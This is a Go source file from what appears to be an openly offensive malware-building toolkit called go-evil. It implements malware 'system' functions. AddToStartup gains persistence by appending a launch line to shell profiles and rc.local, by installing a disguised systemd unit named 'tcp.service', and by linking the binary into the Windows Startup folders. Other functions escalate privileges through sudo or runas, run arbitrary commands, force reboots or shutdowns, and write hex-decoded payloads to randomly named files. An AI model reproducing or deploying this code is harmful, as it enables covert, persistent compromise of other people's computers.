package domains

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"

	malware "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/converter"
	"github.com/s9rA16Bf4/go-evil/utility/io"
	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
	"gopkg.in/go-rillas/subprocess.v1"
)

type system_t struct {
	file_name        string
	output_directory string // Where should the output be placed. Only used when creating a file currently
}

var c_system system_t

func Exit(status_lvl string) {
	status_lvl = run_time.Check_if_variable(status_lvl)
	value := converter.String_to_int(status_lvl, "system.Exit()")
	if value == -1 {
		return
	}
	os.Exit(value)
}

func Out(msg string) {
	msg = run_time.Check_if_variable(msg)
	fmt.Println(msg)
}

func AddToStartup() {
	malware_name, _ := os.Executable() // Grabs also were we currently are
	switch runtime.GOOS {
	case "linux":
		// Target bash & rc.local
		target := []string{"/etc/profile", "~/.bash_profile", "~/.bash_login", "~/.profile", "/etc/rc.local"}
		for _, line := range target {
			in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)
			if err == nil {
				in.WriteString("sudo ." + malware_name + " &") // & tells it to run in the background
			}
		}
		// Target systemd
		in, err := os.Create("/lib/systemd/system/tcp.service")
		if err == nil {
			write := bufio.NewWriter(in)
			what_to_write := []string{
				"[Unit]",
				"Description=My Sample Service",
				"After=multi-user.target",

				"[Service]",
				"Type=idle",
				"ExecStart=." + malware_name,

				"[Install]",
				"WantedBy=multi-user.target",
			}
			for _, line := range what_to_write {
				write.WriteString(line + "\n")
			}
			exec.Command("sudo", "systemctl", "enable", "tcp.service").Run() // Enable it
			exec.Command("sudo", "systemctl", "start", "tcp.service").Run()  // Run it
		}
	case "windows":
		os.Link(malware_name, "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")     // Running user
		os.Link(malware_name, "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") // All users
	}
}

func User_input() {
	var input string
	fmt.Scanln(&input)           // This takes the user input and puts the result into input
	run_time.Set_variable(input) // Save the input
}

func Elevate() {
	executable_location, _ := os.Getwd()  // The working directory
	executable_location += os.Args[0][1:] // The malwares name

	switch runtime.GOOS {
	case "windows":
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		if err != nil { // We currently are not administrators
			executable_location = "runas /user:administrator " + executable_location
			resp := subprocess.RunShell("", "", strings.Split(executable_location, " ")...)
			run_time.Set_variable(resp.StdOut)
		}
	case "linux":
		user, err := user.Current()
		if err != nil {
			notify.Error(err.Error(), "system.Elevate()")
			return
		}
		if user.Username != "root" { // We are not root
			executable_location = "sudo " + executable_location
			resp := subprocess.RunShell("", "", strings.Split(executable_location, " ")...)
			run_time.Set_variable(resp.StdOut)
		}
	}
}

func ReadFile(file string) {
	file = run_time.Check_if_variable(file)
	open_file, err := os.Open(file)
	if err != nil {
		notify.Error(err.Error(), "system.ReadFile()")
		return
	}
	var content string
	scanner := bufio.NewScanner(open_file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		content += scanner.Text()
	}
	run_time.Set_variable(content)
}

func Reboot() {
	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		io.Run_file("shutdown -r now")
	} else if runtime.GOOS == "windows" {
		io.Run_file("shutdown /r")
	}
}
func Shutdown() {
	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		io.Run_file("shutdown -h now")
	} else if runtime.GOOS == "windows" {
		io.Run_file("shutdown /s")
	}
}

func CreateFile(content string) {
	content = run_time.Check_if_variable(content)

	if c_system.file_name == "" {
		Set_filename(malware.Generate_random_name(64))
	}
	if c_system.output_directory == "" {
		Set_output("./")
	}

	file, err := os.Create(c_system.output_directory + c_system.file_name)
	if err != nil {
		notify.Error(err.Error(), "system.CreateFile()")
		return
	}

	_, err = hex.DecodeString(content)
	if err == nil { // Its a text
		file.WriteString(content)
	} else {
		splitted_data := strings.Split(content, "\n")
		for _, read_data := range splitted_data {
			data, _ := hex.DecodeString(read_data)
			file.Write(data)
		}
	}

	file.Close()
	run_time.Set_variable(c_system.file_name) // Filename
}

func RunCommand(command string) {
	command = run_time.Check_if_variable(command)
	resp := io.Run_file(command)
	run_time.Set_variable(resp)
}

func Set_filename(new_file_name string) {
	c_system.file_name = new_file_name
}

func Set_output(new_dir string) {
	if !contains.EndsWith(new_dir, []string{"/"}) {
		new_dir += "/"
	}
	c_system.output_directory = new_dir
}
